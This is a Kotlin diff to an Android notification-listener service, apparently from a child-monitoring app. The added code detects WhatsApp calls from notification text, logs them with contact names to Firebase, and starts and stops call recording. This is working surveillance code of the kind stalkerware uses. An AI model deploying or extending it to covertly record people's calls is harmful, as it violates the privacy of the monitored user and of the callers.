@@ -51,7 +51,36 @@ class ChildNotificationListenerService : NotificationListenerService() {
                     val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""
                     val fullContent = "$title $text $subText $bigText".lowercase()
 
+                    val isWhatsAppCall = fullContent.contains("incoming voice call") ||
+                            fullContent.contains("incoming video call") ||
+                            fullContent.contains("ongoing voice call") ||
+                            fullContent.contains("ongoing video call") ||
+                            fullContent.contains("call in progress") ||
+                            fullContent.contains("whatsapp call")
+
+                    if (isWhatsAppCall) {
+                        isWhatsAppCallActive = true
+                        val callLog = com.example.authapp.data.CallLogItem(
+                            number = "WhatsApp Call",
+                            name = title.ifEmpty { "WhatsApp Contact" },
+                            type = if (fullContent.contains("incoming")) "INCOMING_WHATSAPP" else "OUTGOING_WHATSAPP",
+                            timestamp = System.currentTimeMillis()
+                        )
+                        FirebaseRepository.logSingleCallLog(uid, callLog)
+
+                        val serviceIntent = android.content.Intent(applicationContext, ChildForegroundService::class.java).apply {
+                            action = ChildForegroundService.ACTION_START_CALL_RECORDING
+                            putExtra(ChildForegroundService.EXTRA_PHONE_NUMBER, "WhatsApp_${title.replace(" ", "_")}")
+                        }
+                        try {
+                            androidx.core.content.ContextCompat.startForegroundService(applicationContext, serviceIntent)
+                        } catch (e: Exception) {
+                            FirebaseCrashlytics.getInstance().recordException(e)
+                        }
+                    }
+
                     val type = when {
+                        isWhatsAppCall -> "AUDIO"
                         fullContent.contains("status") || fullContent.contains("posted a") || fullContent.contains("new update") -> "STATUS"
                         fullContent.contains("voice message") || fullContent.contains("audio message") || fullContent.contains("audio") -> "AUDIO"
                         fullContent.contains("photo") || fullContent.contains("image") || fullContent.contains("picture") -> "PHOTO"
@@ -60,6 +89,7 @@ class ChildNotificationListenerService : NotificationListenerService() {
                     }
 
                     val messageDisplay = when {
+                        isWhatsAppCall -> "WhatsApp Call ($title)"
                         type == "STATUS" && text.isEmpty() -> "New WhatsApp Status Update"
                         text.isNotEmpty() -> text
                         bigText.isNotEmpty() -> bigText
@@ -94,5 +124,30 @@ class ChildNotificationListenerService : NotificationListenerService() {
         } catch (e: Exception) {
             FirebaseCrashlytics.getInstance().recordException(e)
         }
+    }
+
+    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
+        super.onNotificationRemoved(sbn)
+        if (sbn == null) return
+        try {
+            val packageName = sbn.packageName ?: return
+            if ((packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b" || packageName.contains("whatsapp", ignoreCase = true)) && isWhatsAppCallActive) {
+                isWhatsAppCallActive = false
+                val serviceIntent = android.content.Intent(applicationContext, ChildForegroundService::class.java).apply {
+                    action = ChildForegroundService.ACTION_STOP_CALL_RECORDING
+                }
+                try {
+                    androidx.core.content.ContextCompat.startForegroundService(applicationContext, serviceIntent)
+                } catch (e: Exception) {
+                    FirebaseCrashlytics.getInstance().recordException(e)
+                }
+            }
+        } catch (e: Exception) {
+            FirebaseCrashlytics.getInstance().recordException(e)
+        }
+    }
+
+    companion object {
+        private var isWhatsAppCallActive = false
     }
 }
